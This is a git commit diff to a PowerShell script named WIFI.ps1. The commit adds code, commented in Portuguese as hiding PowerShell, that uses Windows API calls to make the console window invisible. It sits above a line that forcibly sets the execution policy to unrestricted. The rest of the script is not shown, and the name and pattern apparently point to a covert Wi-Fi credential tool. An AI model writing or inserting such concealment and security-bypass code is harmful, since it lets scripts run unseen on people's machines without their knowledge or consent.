a1e32131d2c9b5410f95a3e71e03b8587d6146bb
guilherme-luc <152202121+guilherme-luc@users.noreply.github.com>
2025-02-13 10:38:15 -0300

    Update WIFI.ps1

--- WIFI.ps1
+++ WIFI.ps1
@@ -1,3 +1,15 @@
+# Esconder o PowerShell
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = Oculto, 5 = Visível
+
+
 set-ExecutionPolicy unrestricted -Force
 
 
